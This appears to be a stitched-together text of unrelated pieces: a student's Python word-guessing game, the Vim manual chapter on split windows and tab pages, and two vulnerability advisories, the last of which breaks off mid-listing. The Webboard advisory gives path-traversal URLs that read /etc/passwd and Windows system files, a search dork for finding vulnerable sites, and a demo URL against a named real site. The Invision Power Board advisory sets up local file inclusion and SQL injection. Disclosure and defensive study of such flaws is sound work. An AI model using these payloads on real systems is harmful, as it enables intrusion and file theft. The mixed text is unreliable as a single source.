'''
By: Esther Arazi

This program gives the user a word to guess based on the user's input
of level and catagory choice. Additionally, keeps track of the user's
wins and losses while playing the game.

'''

WINS = 0 # Tracks the number of wins
LOSSES = 0 # Tracks the number losses
TRIES_LFT = 10 # Tracks the amount of tries the user has left
WRONG_CHS = [] # A list of the wrong characters chosen by the user
CRCT_CHS = [] # A list of the correct characters chosen by the user
CHOSEN_WRD = ['_'] # The blank spaces used to fill when guessing the word

# Three "dictionaries of catagories and within the level choices
animals = {
    'easy': ['monkey', 'rabbit', 'spider', 'jaguar', 'parrot'],
    'medium': ['elephant', 'anteater', 'kangaroo', 'chipmunk'],
    'hard': ['grasshopper', 'woodpecker', 'rattlesnake', 'salamander']
}

sports = {
    'easy': ['soccer','karate','hockey','tennis','skiing'],
    'medium': ['baseball','swimming','football','lacrosse'],
    'hard': ['basketball', 'volleyball','cheerleading','kickboxing']
}

foods = {
    'easy': ['tomato', 'muffin', 'banana', 'potato','orange'],
    'medium': ['oatmeal','eggplant', 'cucumber','sandwich'],
    'hard': ['cheesecake','watermelon','peppermint', 'cappuccino']
}

categories = [animals, sports, foods] # Allows that all the three categories to be one dictionary

animals_e = categories[0]['easy'] # Each catagory is separated based on the list and level
animals_m = categories[0]['medium']
animals_h = categories[0]['hard']

sports_e = categories[1]['easy']
sports_m = categories[1]['medium']
sports_h = categories[1]['hard']

food_e = categories[2]['easy']
food_m = categories[2]['medium']
food_h = categories[2]['hard']

#---------- TODO ----------
import random

def user_input_str(prompt, allowed):
    '''
    This function ensures that the user's input is a string.
    Prompt the user the questions of level and catagory choice.

    :param prompt: The Questions
    :param allowed: The given answers, so that valid answers are the catagories and level choices.
    :return: evaluates the user's input if it is valid
    '''

    allowed_lower = [a.lower() for a in allowed]
    prompt = prompt + str(allowed_lower) + ': '
    while True:
        try:
            user_input = input(prompt).lower().strip()
            if user_input not in allowed_lower:
                raise ValueError('Invalid Input')
            return user_input
        except ValueError:
            print('Invalid Input â€” please try again.')


def user_level_animal_choice(level):
    '''
    Based on the user's input, if the user asked for the "animals" catagory and based
    on the level choice, the game prompts the "secret word" to the user.
    :param level: Based on user's level choice
    :return: the level word of that catagory
    '''

    if level == 'easy':
        return random.choice(animals_e) # Gives a random easy word in this catagory
    elif level == 'medium':
        return random.choice(animals_m) # Gives a random medium - level word in this catagory
    else:
        return random.choice(animals_h) # Gives a random hard word in this catagory


def user_level_food_choice(level):
    '''
    Based on the user's input, if the user asked for the "foods" catagory and based
    on the level choice, the game prompts the "secret word" to the user.
    :param level: Based on user's level choice
    :return: the level word of that catagory
    '''

    if level == 'easy':
        return random.choice(food_e) # Gives a random easy word in this catagory
    elif level == 'medium':
        return random.choice(food_m) # Gives a random medium - level word in this catagory
    else:
        return random.choice(food_h) # Gives a random hard word in this catagory


def user_level_sports_choice(level):
    '''
       Based on the user's input, if the user asked for the "foods" catagory and based
       on the level choice, the game prompts the "secret word" to the user.
       :param level: Based on user's level choice
       :return: the level word of that catagory
       '''

    if level == 'easy':
        return random.choice(sports_e) # Gives a random easy word in this catagory
    elif level == 'medium':
        return random.choice(sports_m) # Gives a random medium - level word in this catagory
    else:
        return random.choice(sports_h) # Gives a random hard word in this catagory


def user_category_choice(level, category):
    '''
    Based on the user's level choice and catagory choice,
    the game propmt the user the "secret word".
    :param level: user's level choice.
    :param category: user's catagory choice.
    :return: the catagory choice
    '''

    if category == 'sports':
        return user_level_sports_choice(level)
    elif category == 'foods':
        return user_level_food_choice(level)
    elif category == 'animals':
        return user_level_animal_choice(level)
    else:
        print('Invalid Input')


#------------ Evaluate User Input -----------

def eval_user_input(guess_lttr, secret_word):
    '''
    This function evaluates the user's inputs and guesses.
    :param guess_lttr: The user's input, either letter or if they guess the word
    :param secret_word: The chosen word for the user to guess.
    :return: ensure that the user's guesses are valid.
    '''

    global WINS, LOSSES, TRIES_LFT, WRONG_CHS, CRCT_CHS, CHOSEN_WRD

    # If the full word was guessed - based on full word input
    if guess_lttr == secret_word:
        print()
        print(f'Congrats! You guessed the word! - "{secret_word}"')
        WINS += 1
        print(
            f'Wins: {WINS}    Losses: {LOSSES}    Tries Left: {TRIES_LFT}'
        )
        return True

    #If the user guesses and incorrect word
    if len(guess_lttr) > 1 and guess_lttr.isalpha() and guess_lttr != secret_word:
        TRIES_LFT -= 1
        print()
        print(f'Incorrect word guess! "{guess_lttr}" is not the secret word.')
        print(f'Tries left: {TRIES_LFT}')

    #Single letter guesses -- either right or wrong
    elif len(guess_lttr) == 1 and guess_lttr.isalpha():

        # if user guessed a letter already
        if guess_lttr in CRCT_CHS or guess_lttr in WRONG_CHS:
            print()
            print(f"You already guessed '{guess_lttr}'. Choose a new letter.")
            print(f'Tries left: {TRIES_LFT}')
            print()
            print(' '.join(CHOSEN_WRD))
            return False

        # if user guessed a correct letter
        if guess_lttr in secret_word:

            # reveals correct letters
            for index, character in enumerate(secret_word):
                if character == guess_lttr:
                    CHOSEN_WRD[index] = character

            if guess_lttr not in CRCT_CHS:
                CRCT_CHS.append(guess_lttr)
                print()
                print(f'You guessed correctly!')
                print(f'Tries left: {TRIES_LFT}')
                print(' '.join(CHOSEN_WRD))

            #check if full word was guessed - based on letter inputs
            if '_' not in CHOSEN_WRD:
                print()
                print(f'Congrats! You guessed the word! - "{secret_word}"')
                WINS += 1
                print(
                    f'Wins: {WINS}    Losses: {LOSSES}    Tries Left: {TRIES_LFT}'
                )
                return True

        else:

            # Prevents duplicates in wrong guesses
            if guess_lttr not in WRONG_CHS:
                WRONG_CHS.append(guess_lttr)
                TRIES_LFT -= 1
                print()
                print(f'Tries left: {TRIES_LFT}')
                print(f'Try again. You chose: {WRONG_CHS}')
                print()
                print(' '.join(CHOSEN_WRD))

            # When user is out of tries
            if TRIES_LFT == 0:
                print()
                print(f"You're out of tries! The word was: {secret_word}")
                LOSSES += 1
                print(
                    f'Wins: {WINS}    Losses: {LOSSES}    Tries Left: {TRIES_LFT}'
                )
                return True
    else:
        print()
        print('Invalid input.')


# -------- Loops Question ----------

def word_letter_guesses(secret_word):
    '''
    This function prompts the user to "guess the word" -- either inputting a letter or
    to guess the word
    :param secret_word: The chosen word for the user to guess.
    '''
    while True:
        print()
        guess_lttr = input('Guess a letter or input the word: ').lower().strip()

        # Calls the evaluator function
        done = eval_user_input(guess_lttr, secret_word)

        if done:  # if True == game over -- when user guesses the word
            break


def game_restart():
    '''
    This function resets the tries, the lists: the wrong and correct letters, and the
    list that is used for the blank line to fill in the word.
    '''

    global TRIES_LFT, WRONG_CHS, CRCT_CHS, CHOSEN_WRD
    # resets game
    TRIES_LFT = 10
    WRONG_CHS = []
    CRCT_CHS = []
    CHOSEN_WRD = ['_']


#---------- Main Program ----------

def main():
    '''
    The main funcion of the program and where the game runs.
    '''

    global CHOSEN_WRD

    while True: # Used to rerun game if user chooses to play again.
        game_restart()
        print()
        print('Welcome to Guess the Word!')

        # Asks the user what level to play
        level = user_input_str(
            'Choose a level to play: ', ['Easy', 'Medium', 'Hard']
        )

        # Asks the user what category to play
        category = user_input_str(
            'Choose a catagory: ', ['Sports', 'Foods', 'Animals']
        )
        print()

        secret_word = user_category_choice(level, category) # Chooses the chosen word for the user

        CHOSEN_WRD = ['_'] * len(secret_word) # Creates the list of underscores - "_"
        print(' '.join(CHOSEN_WRD))

        word_letter_guesses(secret_word)
        print()

        # Asks the user if they want to play again or not
        user_restart = (
            user_input_str('Want to play again?', ['yes', 'no'])
        )

        if user_restart == 'yes':
            continue

        elif user_restart == 'no':
            print()
            print('Thanks for playing!')
            print(
                f'Wins: {WINS}    Losses: {LOSSES}    Tries Left: {TRIES_LFT}'
            )
            break
        else:
            print('Invalid Input')


if __name__ == '__main__':
    main()

"""
secret_word ='hello'
guessed_word = ['_'] * len(secret_word)

print(secret_word, "  ", guessed_word)

def is_guessed_correct(guessed_letter,secret_word,guessed_word):
    for index, character in enumerate(secret_word):
        if character == guessed_letter:
            guessed_word[index] = character

guess1 = 'l'
guess2 = 'c'
is_guessed_correct(guess1,secret_word,guessed_word)
is_guessed_correct(guess2, secret_word, guessed_word)
print(guessed_word)
print(" ".join(guessed_word))

"""
'''
my_dict = {
# has a  key and a value pair
    "easy":["create a list of words (obviously with commas in btw each str"]
    "medium":
    "hard":

}
  #  print(my_dict["easy"])
 #   my_word_list = my_dict["easy"]
 #dict can be called a/t

# import random
my_word_list = my_dict["easy"]
word_to_guess = random.choice(my_word_list)
user_guessed_word = ['_'] * len(word_to_guess)

'''
'''
wins = 0
losses = 0
chosen_letters = []
given_word = None

word_list_levels = {
    "easy":["garden", 'circle', 'turtle', 'window', 'picnic','forest'],
    "medium":['notebook','calendar', "butterfly", 'lavender','sandwich','backpack'],
    "hard":['adventure','breakfast','newspaper', 'dictionary','chameleon','clocktower','playground']
}

import random
def easy_word():
    lvl_easy = word_list_levels["easy"]
    guess_word_easy = random.choice(lvl_easy)
    print(['_']*len(guess_word_easy))

def med_word():
    lvl_med = word_list_levels["medium"]
    guess_word_med = random.choice(lvl_med)
    print(['_']*len(guess_word_med))

def hrd_word():
    lvl_hrd = word_list_levels["hard"]
    guess_word_hrd = random.choice(lvl_hrd)
    print(['_']*len(guess_word_hrd))

'''

'''
    elif lvl_choice != 'easy' or lvl_choice != 'medium' or lvl_choice != 'hard':
        print("Invalid choice. Please insert a level.") #use try and except
    
    elif lvl_choice == 'easy' or lvl_choice =='medium' or lvl_choice =='hard':
'''

'''
    lvl_choice = input("Choose a level to play: Easy, Medium, Hard: ").strip().lower()
        if lvl_choice == 'easy':
            print(easy_word())
        elif lvl_choice == 'medium':
            print(med_word())
        elif lvl_choice == 'hard':
            print(hrd_word())
'''

'''
def main():
    print("Welcome to Guess the Word!")
'''
# ---------- Main Program ----------
'''
def user_lvl_choice(lvl_choice):
    try:
        while word_game == 'easy' or word_game == 'medium' or word_game == 'hard':
            continue
        if word_game == 'easy':
            print(easy_word())
        if word_game == 'medium':  # fix code = make clearer and easier
            print(med_word())
        if word_game == 'hard':
            print(hrd_word())

    except ValueError:
            print("Invalid choice. Please choose a level.")



#---------- Main Program ----------
def main():
    print("Welcome to Guess the Word!")
    #figure out how to capture the data
    word_game("Choose a level to play: ", ['Easy', 'Medium', 'Hard'])

main()
print(word_game)

# if user entered random.choice(___):
    #print("you guessed the word!")
'''


*usr_08.txt*	For Vim version 9.1.  Last change: 2021 May 20

		     VIM USER MANUAL - by Bram Moolenaar

			      Splitting windows


Display two different files above each other.  Or view two locations in the
file at the same time.  See the difference between two files by putting them
side by side.  All this is possible with split windows.

|08.1|	Split a window
|08.2|	Split a window on another file
|08.3|	Window size
|08.4|	Vertical splits
|08.5|	Moving windows
|08.6|	Commands for all windows
|08.7|	Viewing differences with vimdiff
|08.8|	Various
|08.9|	Tab pages

     Next chapter: |usr_09.txt|  Using the GUI
 Previous chapter: |usr_07.txt|  Editing more than one file
Table of contents: |usr_toc.txt|

==============================================================================
*08.1*	Split a window

The easiest way to open a new window is to use the following command: >

	:split

This command splits the screen into two windows and leaves the cursor in the
top one:

	+----------------------------------+
	|/* file one.c */		   |
	|~				   |
	|~				   |
	|one.c=============================|
	|/* file one.c */		   |
	|~				   |
	|one.c=============================|
	|				   |
	+----------------------------------+

What you see here is two windows on the same file.  The line with "====" is
the status line.  It displays information about the window above it.  (In
practice the status line will be in reverse video.)
   The two windows allow you to view two parts of the same file.  For example,
you could make the top window show the variable declarations of a program, and
the bottom one the code that uses these variables.

The CTRL-W w command can be used to jump between the windows.  If you are in
the top window, CTRL-W w jumps to the window below it.  If you are in the
bottom window it will jump to the first window.  (CTRL-W CTRL-W does the same
thing, in case you let go of the CTRL key a bit later.)


CLOSE THE WINDOW

To close a window, use the command: >

	:close

Actually, any command that quits editing a file works, like ":quit" and "ZZ".
But ":close" prevents you from accidentally exiting Vim when you close the
last window.


CLOSING ALL OTHER WINDOWS

If you have opened a whole bunch of windows, but now want to concentrate on
one of them, this command will be useful: >

	:only

This closes all windows, except for the current one.  If any of the other
windows has changes, you will get an error message and that window won't be
closed.

==============================================================================
*08.2*	Split a window on another file

The following command opens a second window and starts editing the given file:
>
	:split two.c

If you were editing one.c, then the result looks like this:

	+----------------------------------+
	|/* file two.c */		   |
	|~				   |
	|~				   |
	|two.c=============================|
	|/* file one.c */		   |
	|~				   |
	|one.c=============================|
	|				   |
	+----------------------------------+

To open a window on a new, empty file, use this: >

	:new

You can repeat the ":split" and ":new" commands to create as many windows as
you like.

==============================================================================
*08.3*	Window size

The ":split" command can take a number argument.  If specified, this will be
the height of the new window.  For example, the following opens a new window
three lines high and starts editing the file alpha.c: >

	:3split alpha.c

For existing windows you can change the size in several ways.  When you have a
working mouse, it is easy: Move the mouse pointer to the status line that
separates two windows, and drag it up or down.

To increase the size of a window: >

	CTRL-W +

To decrease it: >

	CTRL-W -

Both of these commands take a count and increase or decrease the window size
by that many lines.  Thus "4 CTRL-W +" make the window four lines higher.

To set the window height to a specified number of lines: >

	{height}CTRL-W _

That's: a number {height}, CTRL-W and then an underscore (the - key with Shift
on English-US keyboards).
   To make a window as high as it can be, use the CTRL-W _ command without a
count.


USING THE MOUSE

In Vim you can do many things very quickly from the keyboard.  Unfortunately,
the window resizing commands require quite a bit of typing.  In this case,
using the mouse is faster.  Position the mouse pointer on a status line.  Now
press the left mouse button and drag.  The status line will move, thus making
the window on one side higher and the other smaller.


OPTIONS

The 'winheight' option can be set to a minimal desired height of a window and
'winminheight' to a hard minimum height.
   Likewise, there is 'winwidth' for the minimal desired width and
'winminwidth' for the hard minimum width.
   The 'equalalways' option, when set, makes Vim equalize the windows sizes
when a window is closed or opened.

==============================================================================
*08.4*	Vertical splits

The ":split" command creates the new window above the current one.  To make
the window appear at the left side, use: >

	:vsplit

or: >
	:vsplit two.c

The result looks something like this:

	+--------------------------------------+
	|/* file two.c */   |/* file one.c */  |
	|~		    |~		       |
	|~		    |~		       |
	|~		    |~		       |
	|two.c===============one.c=============|
	|				       |
	+--------------------------------------+

Actually, the | lines in the middle will be in reverse video.  This is called
the vertical separator.  It separates the two windows left and right of it.

There is also the ":vnew" command, to open a vertically split window on a new,
empty file.  Another way to do this: >

	:vertical new

The ":vertical" command can be inserted before another command that splits a
window.  This will cause that command to split the window vertically instead
of horizontally.  (If the command doesn't split a window, it works
unmodified.)


MOVING BETWEEN WINDOWS

Since you can split windows horizontally and vertically as much as you like,
you can create almost any layout of windows.  Then you can use these commands
to move between them:

	CTRL-W h	move to the window on the left
	CTRL-W j	move to the window below
	CTRL-W k	move to the window above
	CTRL-W l	move to the window on the right

	CTRL-W t	move to the TOP window
	CTRL-W b	move to the BOTTOM window

You will notice the same letters as used for moving the cursor.  And the
cursor keys can also be used, if you like.
   More commands to move to other windows: |Q_wi|.

==============================================================================
*08.5*	Moving windows

You have split a few windows, but now they are in the wrong place.  Then you
need a command to move the window somewhere else.  For example, you have three
windows like this:

	+----------------------------------+
	|/* file two.c */		   |
	|~				   |
	|~				   |
	|two.c=============================|
	|/* file three.c */		   |
	|~				   |
	|~				   |
	|three.c===========================|
	|/* file one.c */		   |
	|~				   |
	|one.c=============================|
	|				   |
	+----------------------------------+

Clearly the last one should be at the top.  Go to that window (using CTRL-W w)
and then type this command: >

	CTRL-W K

This uses the uppercase letter K.  What happens is that the window is moved to
the very top.  You will notice that K is again used for moving upwards.
   When you have vertical splits, CTRL-W K will move the current window to the
top and make it occupy the full width of the Vim window.  If this is your
layout:

	+-------------------------------------------+
	|/* two.c */  |/* three.c */  |/* one.c */  |
	|~	      |~	      |~	    |
	|~	      |~	      |~	    |
	|~	      |~	      |~	    |
	|~	      |~	      |~	    |
	|~	      |~	      |~	    |
	|two.c=========three.c=========one.c========|
	|					    |
	+-------------------------------------------+

Then using CTRL-W K in the middle window (three.c) will result in:

	+-------------------------------------------+
	|/* three.c */				    |
	|~					    |
	|~					    |
	|three.c====================================|
	|/* two.c */	       |/* one.c */	    |
	|~		       |~		    |
	|two.c==================one.c===============|
	|					    |
	+-------------------------------------------+

The other three similar commands (you can probably guess these now):

	CTRL-W H	move window to the far left
	CTRL-W J	move window to the bottom
	CTRL-W L	move window to the far right

==============================================================================
*08.6*	Commands for all windows

When you have several windows open and you want to quit Vim, you can close
each window separately.  A quicker way is using this command: >

	:qall

This stands for "quit all".  If any of the windows contain changes, Vim will
not exit.  The cursor will automatically be positioned in a window with
changes.  You can then either use ":write" to save the changes, or ":quit!" to
throw them away.

If you know there are windows with changes, and you want to save all these
changes, use this command: >

	:wall

This stands for "write all".  But actually, it only writes files with
changes.  Vim knows it doesn't make sense to write files that were not
changed.
   And then there is the combination of ":qall" and ":wall": the "write and
quit all" command: >

	:wqall

This writes all modified files and quits Vim.
   Finally, there is a command that quits Vim and throws away all changes: >

	:qall!

Be careful, there is no way to undo this command!


OPENING A WINDOW FOR ALL ARGUMENTS

To make Vim open a window for each file, start it with the "-o" argument: >

	vim -o one.txt two.txt three.txt

This results in:

	+-------------------------------+
	|file one.txt			|
	|~				|
	|one.txt========================|
	|file two.txt			|
	|~				|
	|two.txt========================|
	|file three.txt			|
	|~				|
	|three.txt======================|
	|				|
	+-------------------------------+

The "-O" argument is used to get vertically split windows.
   When Vim is already running, the ":all" command opens a window for each
file in the argument list.  ":vertical all" does it with vertical splits.

==============================================================================
*08.7*	Viewing differences with vimdiff

There is a special way to start Vim, which shows the differences between two
files.  Let's take a file "main.c" and insert a few characters in one line.
Write this file with the 'backup' option set, so that the backup file
"main.c~" will contain the previous version of the file.
   Type this command in a shell (not in Vim): >

	vimdiff main.c~ main.c

Vim will start, with two windows side by side.  You will only see the line
in which you added characters, and a few lines above and below it.

	 VV		      VV
	+-----------------------------------------+
	|+ +--123 lines: /* a|+ +--123 lines: /* a|  <- fold
	|  text		     |	text		  |
	|  text		     |	text		  |
	|  text		     |	text		  |
	|  text		     |	changed text	  |  <- changed line
	|  text		     |	text		  |
	|  text		     |	------------------|  <- deleted line
	|  text		     |	text		  |
	|  text		     |	text		  |
	|  text		     |	text		  |
	|+ +--432 lines: text|+ +--432 lines: text|  <- fold
	|  ~		     |	~		  |
	|  ~		     |	~		  |
	|main.c~==============main.c==============|
	|					  |
	+-----------------------------------------+

(This picture doesn't show the highlighting, use the vimdiff command for a
better look.)

The lines that were not modified have been collapsed into one line.  This is
called a closed fold.  They are indicated in the picture with "<- fold".  Thus
the single fold line at the top stands for 123 text lines.  These lines are
equal in both files.
   The line marked with "<- changed line" is highlighted, and the inserted
text is displayed with another color.  This clearly shows what the difference
is between the two files.
   The line that was deleted is displayed with "---" in the main.c window.
See the "<- deleted line" marker in the picture.  These characters are not
really there.  They just fill up main.c, so that it displays the same number
of lines as the other window.


THE FOLD COLUMN

Each window has a column on the left with a slightly different background.  In
the picture above these are indicated with "VV".  You notice there is a plus
character there, in front of each closed fold.  Move the mouse pointer to that
plus and click the left button.  The fold will open, and you can see the text
that it contains.
   The fold column contains a minus sign for an open fold.  If you click on
this -, the fold will close.
   Obviously, this only works when you have a working mouse.  You can also use
"zo" to open a fold and "zc" to close it.


DIFFING IN VIM

Another way to start in diff mode can be done from inside Vim.  Edit the
"main.c" file, then make a split and show the differences: >

	:edit main.c
	:vertical diffsplit main.c~

The ":vertical" command is used to make the window split vertically.  If you
omit this, you will get a horizontal split.

If you have a patch or diff file, you can use the third way to start diff
mode.  First edit the file to which the patch applies.  Then tell Vim the name
of the patch file: >

	:edit main.c
	:vertical diffpatch main.c.diff

WARNING: The patch file must contain only one patch, for the file you are
editing.  Otherwise you will get a lot of error messages, and some files might
be patched unexpectedly.
   The patching will only be done to the copy of the file in Vim.  The file on
your harddisk will remain unmodified (until you decide to write the file).


SCROLL BINDING

When the files have more changes, you can scroll in the usual way.  Vim will
try to keep both the windows start at the same position, so you can easily see
the differences side by side.
   When you don't want this for a moment, use this command: >

	:set noscrollbind


JUMPING TO CHANGES

When you have disabled folding in some way, it may be difficult to find the
changes.  Use this command to jump forward to the next change: >

	]c

To go the other way use: >

	[c

Prepended a count to jump further away.


REMOVING CHANGES

You can move text from one window to the other.  This either removes
differences or adds new ones.  Vim doesn't keep the highlighting updated in
all situations.  To update it use this command: >

	:diffupdate

To remove a difference, you can move the text in a highlighted block from one
window to another.  Take the "main.c" and "main.c~" example above.  Move the
cursor to the left window, on the line that was deleted in the other window.
Now type this command: >

	dp

The change will be removed by putting the text of the current window in the
other window.  "dp" stands for "diff put".
   You can also do it the other way around.  Move the cursor to the right
window, to the line where "changed" was inserted.  Now type this command: >

	do

The change will now be removed by getting the text from the other window.
Since there are no changes left now, Vim puts all text in a closed fold.
"do" stands for "diff obtain".  "dg" would have been better, but that already
has a different meaning ("dgg" deletes from the cursor until the first line).

For details about diff mode, see |vimdiff|.

==============================================================================
*08.8*	Various

The 'laststatus' option can be used to specify when the last window has a
statusline:

	0	never
	1	only when there are split windows (the default)
	2	always

Many commands that edit another file have a variant that splits the window.
For Command-line commands this is done by prepending an "s".  For example:
":tag" jumps to a tag, ":stag" splits the window and jumps to a
tag.
   For Normal mode commands a CTRL-W is prepended.  CTRL-^ jumps to the
alternate file, CTRL-W CTRL-^ splits the window and edits the alternate file.

The 'splitbelow' option can be set to make a new window appear below the
current window.  The 'splitright' option can be set to make a vertically split
window appear right of the current window.

When splitting a window you can prepend a modifier command to tell where the
window is to appear:

	:leftabove {cmd}	left or above the current window
	:aboveleft {cmd}	idem
	:rightbelow {cmd}	right or below the current window
	:belowright {cmd}	idem
	:topleft {cmd}		at the top or left of the Vim window
	:botright {cmd}		at the bottom or right of the Vim window


==============================================================================
*08.9*	Tab pages

You will have noticed that windows never overlap.  That means you quickly run
out of screen space.  The solution for this is called Tab pages.

Assume you are editing "thisfile".  To create a new tab page use this command: >

	:tabedit thatfile

This will edit the file "thatfile" in a window that occupies the whole Vim
window.  And you will notice a bar at the top with the two file names:

	+----------------------------------+
	| thisfile | /thatfile/ __________X|    (thatfile is bold)
	|/* thatfile */			   |
	|that				   |
	|that				   |
	|~				   |
	|~				   |
	|~				   |
	|				   |
	+----------------------------------+

You now have two tab pages.  The first one has a window for "thisfile" and the
second one a window for "thatfile".  It's like two pages that are on top of
each other, with a tab sticking out of each page showing the file name.

Now use the mouse to click on "thisfile" in the top line.  The result is

	+----------------------------------+
	| /thisfile/ | thatfile __________X|    (thisfile is bold)
	|/* thisfile */			   |
	|this				   |
	|this				   |
	|~				   |
	|~				   |
	|~				   |
	|				   |
	+----------------------------------+

Thus you can switch between tab pages by clicking on the label in the top
line.  If you don't have a mouse or don't want to use it, you can use the "gt"
command.  Mnemonic: Goto Tab.

Now let's create another tab page with the command: >

	:tab split

This makes a new tab page with one window that is editing the same buffer as
the window we were in:

	+-------------------------------------+
	| thisfile | /thisfile/ | thatfile __X|   (thisfile is bold)
	|/* thisfile */			      |
	|this				      |
	|this				      |
	|~				      |
	|~				      |
	|~				      |
	|				      |
	+-------------------------------------+

You can put ":tab" before any Ex command that opens a window.  The window will
be opened in a new tab page.  Another example: >

	:tab help gt

Will show the help text for "gt" in a new tab page.

A few more things you can do with tab pages:

- click with the mouse in the space after the last label
	The next tab page will be selected, like with "gt".

- click with the mouse on the "X" in the top right corner
	The current tab page will be closed.  Unless there are unsaved
	changes in the current tab page.

- double click with the mouse in the top line
	A new tab page will be created.

- the "tabonly" command
	Closes all tab pages except the current one.  Unless there are unsaved
	changes in other tab pages.

For more information about tab pages see |tab-page|.

==============================================================================

Next chapter: |usr_09.txt|  Using the GUI

Copyright: see |manual-copyright|  vim:tw=78:ts=8:noet:ft=help:norl:

Webboard <= v.2.90 beta Remote File Disclosure Vulnerability

=============================================================

Author: MrDoug
Email: mrdoug13 [at] gmail [dot] com

Greetz to all my friends

=============================================================

There are 3 vulnerable calls to fopen() in "/webboard/view.php"
They are on lines 7, 109 and 113.  I have not actually read the
source but based on tests I would GUESS they look something
like this...


  7: fopen('title/' . $_GET['topic'] . '.txt');

...

109: fopen('counter/read/' . $_GET['topic'] . '.txt');

...

113: fopen('counter/read/' . $_GET['topic'] . '.txt');


IMPORTANT:
Due to the trailing ".txt", retrieving files with different
extensions will be difficult unless you are able to get a
null byte through without it being escaped.

=============================================================

Example 1: /webboard/view.php?topic=../../../../../../etc/passwd%00
Example 2: /webboard/view.php?topic=../../../../../../WINDOWS/system32/eula

Dork: inurl:"webboard/view.php?topic="

Demo: http://korat.nfe.go.th/ksn00/webboard/view.php?topic=../../../../../../WINDOWS/system32/eula

# milw0rm.com [2009-05-29]
=============================================
- Severity: Moderately High
=============================================

I. VULNERABILITY
-------------------------
Invision Power Board <= 3.0.4 Local PHP File Inclusion and SQL Injection
Invision Power Board <= 2.3.6 SQL Injection

II. BACKGROUND
-------------------------

Invision Power Board (IPB) is a professional forum system that has been built from the ground up with speed and security in mind, taking advantage of object

oriented code, highly-optimized SQL queries, and the fast PHP engine. A

comprehensive administration control panel is included to help you keep your board running smoothly. Moderators will also enjoy the full range of options available to them via built-in tools and moderators control panel. Members will appreciate the ability to subscribe to topics, send private messages, and

perform a host of other options through the user control panel.

III. INTRODUCTION
-------------------------

For a good understanding of the vulnerabilities it is necessary to be familiar

with the way IPB handles input data. Below is a quick trace of input
validation process. The code snippets come from IPB version 3.0.4.

line | file: admin/sources/base/ipsRegistry.php
352  | static public function init()
353  | {
...  |
...  |
462  | IPSLib::cleanGlobals( $_GET );
463  | IPSLib::cleanGlobals( $_POST );
464  | IPSLib::cleanGlobals( $_COOKIE );
465  | IPSLib::cleanGlobals( $_REQUEST );
466  |
467  | # GET first
468  | $input = IPSLib::parseIncomingRecursively( $_GET, array() );
469  |
470  | # Then overwrite with POST

471 | self::$request = IPSLib::parseIncomingRecursively( $_POST, $input );

...  |


The init() function cleans the input data passed via methods like GET, POST or

others at the start of each request to the forum before any of the input
variables are processed.

Let's look into sanitization performed by cleanGlobals function:

line | file: admin/sources/base/core.php
1644 | static public function cleanGlobals( &$data, $iteration = 0 )
1645 | {
...  |
1654 |        foreach( $data as $k => $v )
1655 |        {
1656 |               if ( is_array( $v ) )
1657 |               {

1658 | self::cleanGlobals( $data[ $k ], ++ $iteration );

1659 |               }
1660 |               else
1661 |               {
1662 |                       # Null byte characters
1663 |                       $v = str_replace( chr('0') , '', $v );
1664 |                       $v = str_replace( "\0"    , '', $v );
1665 |                       $v = str_replace( "\x00"  , '', $v );
1666 |                       $v = str_replace( '%00'   , '', $v );
1667 |
1668 |                       # File traversal

1669 | $v = str_replace( "../", "../", $v );

1670 |
1671 |                       $data[ $k ] = $v;
1672 |               }
1673 |        }
1674 | }


As we can see the function removes null characters and "../" sequences from

incoming data to prevent unwanted file inclusion.

The next function that affects the input is:

line | file: admin/sources/base/core.php

1573 | static public function parseIncomingRecursively( &$data, $input=array(), $iteration = 0 )

1574 | {
...  |
1583 |        foreach( $data as $k => $v )
1584 |        {
1585 |                if ( is_array( $v ) )
1586 |                {

1587 | $input[ $k ] = self::parseIncomingRecursively( $data[ $k ], array(), ++$iteration );

1588 |                }
1589 |                else
1590 |                {
1591 |                        $k = IPSText::parseCleanKey( $k );

1592 | $v = IPSText::parseCleanValue( $v, false );

1593 |
1594 |                        $input[ $k ] = $v;
1595 |                }
1596 |        }
1597 |
1598 |        return $input;
1599 | }

The purpose of this function is to clean the key/value pairs of an array

passed to it with help of the parseCleanKey and parseCleanValue functions. The first one can be skipped as neither of the attacks described later on require

special characters inside variable names. The other looks as follows:

line | file: admin/sources/base/core.php
4100 | static public function parseCleanValue( $val, $postParse=true )
4101 | {
4102 |     if ( $val == "" )
4103 |     {
4104 |             return "";
4105 |     }
4106 |

4107 | $val = str_replace( " ", " ", IPSText::stripslashes($val) );

4108 |
4109 |     # Convert all carriage return combos

4110 | $val = str_replace( array( "\r\n", "\n\r", "\r" ), "\n", $val );

4111 |
4112 |     $val = str_replace( "&", "&", $val );
4113 |     $val = str_replace( "<!--", "&#60;&#33;--", $val );
4114 |     $val = str_replace( "-->", "--&#62;", $val );
4115 |     $val = str_ireplace( "<script", "&#60;script", $val );
4116 |     $val = str_replace( ">", ">", $val );
4117 |     $val = str_replace( "<", "<", $val );
4118 |     $val = str_replace( '"', """, $val );

4119 | $val = str_replace( "\n", "<br />", $val ); // Convert literal newlines

4120 |     $val = str_replace( "$", "$", $val );
4121 |     $val = str_replace( "!", "!", $val );

4122 | $val = str_replace( "'", "'", $val ); // IMPORTANT: It helps to increase sql query safety.

4123 |
4124 |     if ( IPS_ALLOW_UNICODE )
...  |


The function cleans input data from characters used typically in XSS and SQL

attacks.


The resulting array containing sanitized input data from GET/POST methods is stored in ipsRegistry::$request array (as we can see on the first code

listing).

IV. LOCAL FILE INCLUSION VULNERABILITY
-------------------------

1. Description.


It is possible to include an arbitrary php file stored on the server in any

location (accessible by the php/web server process) by exploiting the
following code of IPB 3.0.4:

line | file: admin/sources/base/ipsController.php
142  |public function getCommand( ipsRegistry $registry )
143  |{
144  |         $_NOW = IPSDebug::getMemoryDebugFlag();
145  |
146  |         $module    = ipsRegistry::$current_module;
147  |         $section   = ipsRegistry::$current_section;

148 | $filepath = IPSLib::getAppDir( IPS_APP_COMPONENT ) . '/' . self::$modules_dir . '/' . $module . '/';

149  |
150  |         /* Got a section? */
151  |         if ( ! $section )
152  |         {

153 | if ( file_exists( $filepath . 'defaultSection.php' ) )

154  |                 {
155  |                         $DEFAULT_SECTION = '';

156 | require( $filepath . 'defaultSection.php' );

157  |
158  |                         if ( $DEFAULT_SECTION )
159  |                         {
160  |                                 $section = $DEFAULT_SECTION;
161  |                         }
162  |                 }
163  |         }
164  |

165 | $classname = self::$class_dir . '_' . IPS_APP_COMPONENT . '_' . $module . '_' . $section;

166  |
167  |         if ( file_exists( $filepath . 'manualResolver.php' ) )
168  |         {
169  |                 require_once( $filepath . 'manualResolver.php' );

